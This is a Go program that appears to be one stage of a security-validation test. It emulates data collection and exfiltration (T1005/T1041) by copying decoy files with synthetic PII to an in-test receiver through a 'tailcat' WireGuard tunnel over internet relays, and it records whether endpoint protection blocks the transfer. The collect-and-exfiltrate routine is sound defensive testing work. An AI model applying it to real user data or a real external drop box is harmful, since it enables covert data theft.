// Stage 3 — T1005 Data from Local System + T1041 Exfiltration Over C2 Channel
// (tactics: collection, exfiltration)
//
// Kothamine stages and exfiltrates victim data over its tailcat C2 channel.
// This stage creates a fictitious user file set (decoy documents with
// synthetic, format-valid but never-issued PII — see decoy.go for the safety
// invariants) under ARTIFACT_DIR, spawns an in-test receiver representing the
// attacker's external drop box (`tailcat recv <LOG_DIR>/inbox`), and exfiltrates
// the decoy files to it with `tailcat cp` (system scp routed through the
// WireGuard tunnel). Traffic genuinely egresses through Tailscale's internet
// DERP relays and returns — the user-approved design (2026-10-14).
//
// Success requires CONTENT-LEVEL proof: the receiver renames uploads
// (flat write-only drop box), so verification compares the SHA256 set of the
// received files against the SHA256 set of the decoy sources.
//
// CLASSIFICATION INTEGRITY (CLAUDE.md Bug Prevention Rules 1/3/8):
//   - ARTIFACT_DIR unwritable, missing tailcat binary, missing system scp
//     client, or DERP egress unavailable → 999 prerequisite failure.
//   - 126 only on positive evidence: a decoy file removed after the 3s settle
//     window (os.Stat quarantine) or an OS-emitted denial.
//   - 127 only if the tailcat binary vanishes mid-stage (os.Stat evidence).
//   - A failed or unverifiable transfer without positive block evidence → 999.
//
// Exit codes: 0 = decoys collected and exfiltrated over the encrypted channel
// (hash-verified at the receiver), 126/127 = positive protection evidence,
// 999 = inconclusive.

//go:build windows || linux

package main

import (
	"context"
	"fmt"
	"os"
	"os/exec"
	"path/filepath"
	"strings"
	"time"
)

const (
	TEST_UUID      = "c37d6a01-3934-4e72-9cb1-3dae284b937b"
	TECHNIQUE_ID   = "T1005"
	TECHNIQUE_NAME = "Data Collection + Exfiltration over tailcat C2 (T1005/T1041)"
	STAGE_ID       = 3
)

const (
	recvAddrTimeout = 90 * time.Second
	cpTimeout       = 120 * time.Second
)

func main() {
	AttachLogger(TEST_UUID, fmt.Sprintf("Stage %d: %s", STAGE_ID, TECHNIQUE_ID))
	LogMessage("INFO", TECHNIQUE_ID, fmt.Sprintf("Starting %s", TECHNIQUE_NAME))
	LogStageStart(STAGE_ID, TECHNIQUE_ID, TECHNIQUE_NAME)

	code, detail := runStage()

	switch code {
	case StageSuccess:
		fmt.Printf("[STAGE %s] %s\n", TECHNIQUE_ID, detail)
		LogMessage("SUCCESS", TECHNIQUE_ID, detail)
		LogStageEnd(STAGE_ID, TECHNIQUE_ID, "success", detail)
	case StageBlocked, StageQuarantined, StageQuarantinedOnExec:
		fmt.Printf("[STAGE %s] %s\n", TECHNIQUE_ID, detail)
		LogMessage("WARN", TECHNIQUE_ID, detail)
		LogStageBlocked(STAGE_ID, TECHNIQUE_ID, detail)
	default:
		fmt.Printf("[STAGE %s] %s\n", TECHNIQUE_ID, detail)
		LogMessage("ERROR", TECHNIQUE_ID, detail)
		LogStageEnd(STAGE_ID, TECHNIQUE_ID, "error", detail)
	}
	os.Exit(code)
}

func runStage() (int, string) {
	// --- Prerequisites ---
	if err := EnsureArtifactDir(); err != nil {
		LogMessage("ERROR", TECHNIQUE_ID, fmt.Sprintf("ARTIFACT_DIR prerequisite not met: %v", err))
		fmt.Printf("[STAGE %s] Remediation (run once, elevated):\n", TECHNIQUE_ID)
		for _, cmd := range ArtifactDirRemediation() {
			fmt.Printf("    %s\n", cmd)
		}
		return StageError, fmt.Sprintf("ARTIFACT_DIR prerequisite not met: %v", err)
	}
	if _, err := os.Stat(tailcatPath()); err != nil {
		return StageError, fmt.Sprintf("tailcat binary not present at %s (stage 1 artifact missing): %v", tailcatPath(), err)
	}
	scpPath, err := exec.LookPath("scp")
	if err != nil {
		return StageError, fmt.Sprintf("system scp client not found in PATH (tailcat cp drives it over the tunnel): %v", err)
	}
	LogMessage("INFO", TECHNIQUE_ID, fmt.Sprintf("Prerequisites met: tailcat=%s scp=%s", tailcatPath(), scpPath))

	// --- T1005: create the fictitious user's decoy files ---
	marker := DecoyRunMarker()
	fmt.Printf("[STAGE %s] Creating decoy user files under %s (marker=%s)\n", TECHNIQUE_ID, ARTIFACT_DIR, marker)
	decoys, err := CreateDecoyTree(ARTIFACT_DIR, marker)
	if err != nil {
		return StageError, fmt.Sprintf("could not create decoy files: %v", err)
	}
	defer CleanupDecoyTree(ARTIFACT_DIR, decoys)
	LogMessage("INFO", TECHNIQUE_ID, fmt.Sprintf("Created %d decoy files (marker=%s)", len(decoys), marker))

	// Quarantine check: settle window, then re-stat every decoy (Rule 3).
	time.Sleep(3 * time.Second)
	for _, p := range decoys {
		if _, err := os.Stat(p); os.IsNotExist(err) {
			return StageBlocked, fmt.Sprintf("decoy file %s removed from disk after 3s settle window (os.Stat confirms quarantine)", filepath.Base(p))
		}
	}

	// Hash the sources for later content verification.
	srcHashes := map[string]string{} // sha256 -> source path
	var totalBytes int64
	for _, p := range decoys {
		sum, err := sha256File(p)
		if err != nil {
			return StageError, fmt.Sprintf("could not hash decoy source: %v", err)
		}
		srcHashes[sum] = p
		if fi, err := os.Stat(p); err == nil {
			totalBytes += fi.Size()
		}
	}

	// --- Spawn the in-test receiver (the attacker's drop box) ---
	inbox := filepath.Join(LOG_DIR, "inbox")
	os.RemoveAll(inbox)
	if err := os.MkdirAll(inbox, 0755); err != nil {
		return StageError, fmt.Sprintf("could not create receiver inbox %s: %v", inbox, err)
	}
	defer os.RemoveAll(inbox)

	fmt.Printf("[STAGE %s] Starting in-test receiver: tailcat recv %s\n", TECHNIQUE_ID, inbox)
	srv, err := startTailcatServer("tailcat_recv_output.txt", "recv", inbox)
	if err != nil {
		return classifyExecError(err), fmt.Sprintf("tailcat receiver could not start: %v", err)
	}
	recvStarted := time.Now()
	defer srv.kill()
	LogProcessExecution(tailcatBinaryName(), strings.Join(srv.cmd.Args, " "), srv.cmd.Process.Pid, true, 0, "")

	addr, err := srv.waitAddress(recvAddrTimeout)
	if err != nil {
		return StageError, fmt.Sprintf("receiver published no address: %v", err)
	}
	LogMessage("INFO", TECHNIQUE_ID, fmt.Sprintf("Receiver published address after %s", time.Since(recvStarted).Round(time.Second)))

	// --- T1041: exfiltrate the decoys over the encrypted C2 channel ---
	// tailcat cp drives the system scp through the tunnel. The recv drop box is
	// flat and write-only (it renames uploads), so files are passed individually
	// rather than as a recursive directory copy.
	args := append([]string{"cp"}, decoys...)
	args = append(args, addr+":")
	fmt.Printf("[STAGE %s] Exfiltrating %d decoy files over the tailcat tunnel...\n", TECHNIQUE_ID, len(decoys))
	LogMessage("INFO", TECHNIQUE_ID, fmt.Sprintf("Exfiltrating %d files (%d bytes) to receiver over WireGuard/DERP", len(decoys), totalBytes))

	ctx, cancel := context.WithTimeout(context.Background(), cpTimeout)
	defer cancel()
	out, code, runErr := runCaptured(ctx, "tailcat-cp",
		exec.CommandContext(ctx, tailcatPath(), args...),
		"tailcat_cp_output.txt")
	if runErr != nil {
		return classifyExecError(runErr), fmt.Sprintf("tailcat cp could not run: %v", runErr)
	}
	if code != 0 {
		if _, serr := os.Stat(tailcatPath()); os.IsNotExist(serr) {
			return StageQuarantinedOnExec, "tailcat binary removed from disk mid-stage (os.Stat confirms quarantine)"
		}
		return StageError, fmt.Sprintf("tailcat cp exited %d; output: %s", code, strings.TrimSpace(out))
	}

	// --- Verify: hash-set comparison at the receiver ---
	time.Sleep(2 * time.Second) // let the receiver finish flushing uploads
	received, err := filepath.Glob(filepath.Join(inbox, "*"))
	if err != nil {
		return StageError, fmt.Sprintf("could not list receiver inbox: %v", err)
	}
	matched := 0
	for _, rp := range received {
		fi, err := os.Stat(rp)
		if err != nil || fi.IsDir() {
			continue
		}
		sum, err := sha256File(rp)
		if err != nil {
			continue
		}
		if _, ok := srcHashes[sum]; ok {
			matched++
		}
	}

	if matched == len(decoys) && len(decoys) > 0 {
		detail := fmt.Sprintf("Collected %d decoy files from %s and exfiltrated them over the tailcat C2 channel (DERP relays); all %d SHA256 hashes verified at the receiver (%d bytes, marker=%s)",
			len(decoys), ARTIFACT_DIR, matched, totalBytes, marker)
		LogMessage("INFO", TECHNIQUE_ID, detail)
		return StageSuccess, detail
	}

	// Transfer reported success but content is missing/mismatched — ambiguous,
	// never a block verdict without positive evidence (Rule 8).
	return StageError, fmt.Sprintf("exfiltration unverifiable: %d/%d decoy hashes matched at the receiver (marker=%s)", matched, len(decoys), marker)
}
